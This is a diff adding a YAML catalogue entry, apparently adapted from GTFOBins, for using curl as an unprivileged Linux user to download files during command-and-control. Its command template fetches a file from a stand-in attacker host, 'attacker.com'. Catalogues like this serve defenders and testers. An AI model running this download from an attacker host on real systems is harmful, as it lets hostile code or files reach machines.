@@ -1,0 +1,23 @@
+id: gtfobins/curl/download/unprivileged
+type: binary
+platform: linux
+name: curl
+phases:
+- command-and-control
+capabilities:
+- file-download
+privilege_required: user
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: MIT (verify upstream LICENSE)
+  upstream_version: acd5246
+  last_synced: '2026-08-25'
+commands:
+- template: curl http://attacker.com/path/to/input-file -o /path/to/output-file
+references:
+- https://gtfobins.github.io/gtfobins/curl/
+tags:
+- linux
+- unix
+- gtfobins
